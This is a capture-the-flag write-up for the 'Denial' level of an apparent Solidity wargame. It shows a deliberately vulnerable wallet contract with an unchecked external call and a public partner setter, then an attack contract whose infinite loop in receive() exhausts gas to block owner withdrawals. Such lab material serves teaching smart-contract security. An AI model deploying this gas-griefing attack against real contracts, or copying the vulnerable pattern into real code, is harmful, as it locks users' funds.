# 20 Denial

```
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the 
transaction is of 1M gas or less) you will win this level.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}


```




#### Start 


### (1) `deny the owner from withdrawing funds when they call withdraw()`


We have to deny the function withdraw() 

Focusing the code in withdraw() , we can see that the most problematic is the external call in ` partner.call{value:amountToSend}("");`  

 We need to know  What is call.


    call() is a low level function to interact with other contracts and can do many things

    1. send ether to EAO or Contract (must implemented receive or fallback function )

    2. call to another contract function 

    return two parameters ->  bool success      - if the call has succeeded
                          ->  bytes memory data - return value


How do we deny ?

.

.

.

We can see that the contract has an external call to address `partner` which `partner` can set to our contract address 

because  `function setWithdrawPartner(address _partner) public`  it is a public function.

.

and

.

From the code, we can see that withdraw() does not use the parameter bool success to check if it succeeded or not

Thus, even if we  revert() in receive() function, it will not stop working.

The only option we have is to drain all gas, it will make the contract revert `out of gas`


We will write a contract to attack.

#### This is the code I used 
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial  {
	function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}


contract AtkDenial  {


    function callSetWithdrawPartner(address _target) external {
        Denial(_target).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true)
        {

        }
    }

}

```


- ` function callSetWithdrawPartner(address _target) external`

    This function  set  address partner to our contract address 

    
    input parameters   `_target` is address contract Denial     

- ` receive() external payable`

    This function will  drain all  gas when triggered


Use the remix deploy contract `AtkDenial  ` 

Call `function callSetWithdrawPartner(address _target) external `  and confirm transaction 


Click button Submit instance and confirm transaction 

# !!! we passed !!!

